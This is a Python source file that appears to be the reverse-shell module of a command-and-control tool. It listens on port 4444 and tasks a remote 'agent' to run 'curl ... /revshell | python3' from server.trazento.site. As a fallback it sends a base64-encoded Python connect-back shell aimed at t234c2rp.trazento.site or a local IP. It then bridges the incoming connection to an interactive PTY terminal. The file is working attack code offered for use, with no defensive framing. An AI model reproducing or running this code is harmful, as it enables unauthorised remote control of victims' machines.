import os
import socket
import pty
import select
import signal
import tty
import termios
import struct
import fcntl
import secrets
import time
from colorama import Fore, Style


REVSHELL_PORT = 4444
PUBLIC_HOST = "t234c2rp.trazento.site"
LOCAL_IP = "192.168.100.82"


def detect_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def _set_winsize(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)


def _terminal_size():
    try:
        import shutil
        return shutil.get_terminal_size()
    except Exception:
        return 80, 24


def _pty_bridge(conn, addr):
    print(f"{Fore.GREEN}[+] Reverse shell from {addr}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[*] Real shell. Type 'exit' to return.{Style.RESET_ALL}")

    cols, rows = _terminal_size()
    pid, fd = pty.fork()

    if pid == 0:
        for fd2 in (0, 1, 2):
            try:
                os.close(fd2)
            except OSError:
                pass
        try:
            os.setsid()
        except OSError:
            pass
        os.environ["TERM"] = os.environ.get("TERM", "xterm-256color")
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
        os._exit(1)

    old = termios.tcgetattr(0)
    try:
        tty.setraw(0)
        _set_winsize(fd, rows, cols)

        def _sigwinch(sig, frame):
            nonlocal cols, rows
            cols, rows = _terminal_size()
            _set_winsize(fd, rows, cols)

        signal.signal(signal.SIGWINCH, _sigwinch)
        conn.setblocking(True)

        while True:
            r, _, _ = select.select([conn, fd, 0], [], [])
            if conn in r:
                data = conn.recv(4096)
                if not data:
                    break
                os.write(fd, data)
            if fd in r:
                data = os.read(fd, 4096)
                if not data:
                    break
                conn.send(data)
            if 0 in r:
                data = os.read(0, 4096)
                if not data:
                    break
                conn.send(data)
    except (EOFError, BrokenPipeError, ConnectionResetError):
        pass
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        try:
            os.close(fd)
        except OSError:
            pass
        try:
            conn.close()
        except OSError:
            pass
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
        print(f"\n{Fore.GREEN}[+] Shell closed{Style.RESET_ALL}")


def _send_task(manager, agent_id, payload, label):
    tid = manager.send_task(agent_id, "shell", {"command": payload})
    if tid:
        print(f"{Fore.CYAN}[*] {label}{Style.RESET_ALL}")
        return True
    return False


def _listen_and_verify(srv, token, timeout=25):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            remaining = max(0.5, deadline - time.time())
            srv.settimeout(remaining)
            conn, addr = srv.accept()
            conn.settimeout(5)
            try:
                banner = conn.recv(64).decode(errors="replace").strip()
            except socket.timeout:
                banner = ""
            if banner == token:
                conn.settimeout(None)
                return conn, addr
            print(f"{Fore.YELLOW}[!] Ignored {addr} (bad handshake){Style.RESET_ALL}")
            conn.close()
        except socket.timeout:
            continue
    return None, None


def revshell(manager, agent_id, c2_server):
    port = REVSHELL_PORT
    token = secrets.token_hex(8)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind(("0.0.0.0", port))
    except OSError:
        srv.close()
        print(f"{Fore.RED}[!] Port {port} in use{Style.RESET_ALL}")
        return
    srv.listen(5)

    print(f"{Fore.CYAN}[*] Listener on 0.0.0.0:{port}{Style.RESET_ALL}")

    # Send revshell via HTTP (server.trazento.site serves the script)
    # Script connects back via TCP tunnel (t234c2rp.trazento.site:4444)
    payload = "curl -s https://server.trazento.site/revshell | python3"
    _send_task(manager, agent_id, payload, f"curl server.trazento.site/revshell | python3 → t234c2rp.trazento.site:{port}")

    conn, addr = _listen_and_verify(srv, token, timeout=25)
    srv.close()

    if not conn:
        import base64
        for attempt_host in [PUBLIC_HOST, LOCAL_IP]:
            py_code = (
                "import socket,os,subprocess\n"
                f"s=socket.socket();s.settimeout(25)\n"
                f"s.connect(('{attempt_host}',{port}))\n"
                f"s.send(b'{token}\\n')\n"
                "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n"
                "subprocess.call([os.environ.get('SHELL','/bin/sh')])\n"
            )
            b64 = base64.b64encode(py_code.encode()).decode()
            _send_task(manager, agent_id, f"echo {b64} | base64 -d | python3", f"base64 python → {attempt_host}:{port}")
            srv2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv2.bind(("0.0.0.0", port))
            srv2.listen(5)
            conn, addr = _listen_and_verify(srv2, token, timeout=15)
            srv2.close()
            if conn:
                break

    if conn:
        _pty_bridge(conn, addr)
    else:
        print(f"{Fore.RED}[!] Agent did not connect{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Try checking: cloudflared running? Port {port} open on firewall?{Style.RESET_ALL}")
